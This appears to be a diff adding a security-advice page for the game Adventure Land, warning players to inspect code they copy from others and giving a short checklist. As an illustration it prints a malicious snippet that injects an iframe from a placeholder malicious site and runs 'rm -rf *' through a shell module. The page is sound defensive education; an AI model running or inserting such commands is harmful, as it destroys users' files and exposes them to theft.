@@ -1,0 +1,40 @@
+<p>[Security First!]</p>
+
+<p>In our daily lives, we run codes, programs, games - all from different resources. And we assume these will be safe, and others will make sure they are safe.</p>
+
+<p>You have no other choice, as you can't see or inspect everything your computer runs.</p>
+
+<p>However on Adventure Land you have the chance to quickly glance at every line of a Code you'll copy-paste from a fellow player, and <span style='color:#EB632B'>you must!</span></p>
+
+<p>Doesn't matter if you are a Coder or not, it's usually easy to spot malicious Code!</p>
+
+<p>Here's a quick Checklist:</p>
+
+<pre style='font-family: Pixel; font-size: 32px'>
+	1. Make sure there are no external links inside the Code
+	2. Make sure the Code is simple, understandable
+	3. Make sure the Code doesn't have anything funky
+	4. If you are not sure, ask someone you trust to make sure
+</pre>
+
+<p>If you can't be sure, you <span style='color:#EB4C42'>must-not!</span> copy-paste Code from someone else, and run it!</p>
+
+<p>One example of a bad / malicious Code:</p>
+
+<div class='code'>
+parent.$("body").append("<iframe src='MaliciousWebsite.com' />");
+// Injects a malicious website, to steal your items, and who knows what else?!
+require("shell").execute("rm -rf *");
+// Uses ->require<- in the game client to get higher Node access - to delete everything it can find!
+</div>
+
+<p>Codes you copy-paste, should be as simple to you as:</p>
+
+<div class='code'>
+setInterval(function(){
+	heal(get_player("Wizard"));
+	// It's easy to understand that this is a basic interval that tries to heal Wizard every 5 seconds
+},5000);
+</div>
+
+{#<p>With a game, it's easy to ensure security, but as a friendly advice, keep in mind that we live in a bad world, with bad people, so make sure these people don't have anything on a good person like you, even if the worst case scenario happens, where they get access to all your personal files...</p> (probably too real for a game) #}
